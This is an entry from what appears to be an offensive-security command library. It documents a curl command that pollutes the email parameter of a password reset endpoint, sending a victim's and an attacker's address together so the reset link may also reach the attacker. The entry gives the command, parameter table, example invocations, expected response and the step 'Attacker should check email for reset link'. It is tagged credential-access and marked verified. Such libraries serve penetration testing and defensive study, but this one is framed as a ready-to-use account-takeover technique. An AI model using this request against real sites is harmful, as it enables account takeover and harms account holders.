---
id: 92f93478-09df-4256-9011-4269bb3656e3
name: curl-post-password-reset-parameter-pollution
type: command
executor: bash
data: curl -X POST -d "email=$_VICTIM_EMAIL&email=$_ATTACKER_EMAIL" $_TARGET_URL
output: null
created_at: '2023-04-06T03:55:53.810444+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Web
tags:
  - parameter-manipulation
  - credential-access
verified: true
validated: true
---

# curl-post-password-reset-parameter-pollution

## Command

```bash
curl -X POST -d "email=$_VICTIM_EMAIL&email=$_ATTACKER_EMAIL" $_TARGET_URL
```

## Description

Sends a POST request to the password reset endpoint with duplicated email parameters to pollute the input and potentially trigger resets for both victim and attacker emails.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The password reset endpoint URL (e.g., https://target.com/forgot-password) | Yes |
| $_VICTIM_EMAIL | Victim's email address | Yes |
| $_ATTACKER_EMAIL | Attacker's email address | Yes |
| -X POST | Specifies POST method | Built-in |
| -d | Data to send in request body | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST -d "email=victim@example.com&email=attacker@example.com" https://target.com/reset
```

### Advanced Usage

Add headers for realism:

```bash
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "email=victim@example.com&email=attacker@example.com" https://target.com/reset
```

## Expected Output

HTTP 200 OK or 302 redirect indicating successful reset initiation, e.g.:

```
{"message": "Password reset email sent"}
```
Attacker should check email for reset link.

## Related

- [[procedures/Exploit-Password-Reset-via-Email-Parameter-Manipulation]]
- [[commands/curl-post-password-reset-json-array-emails]]
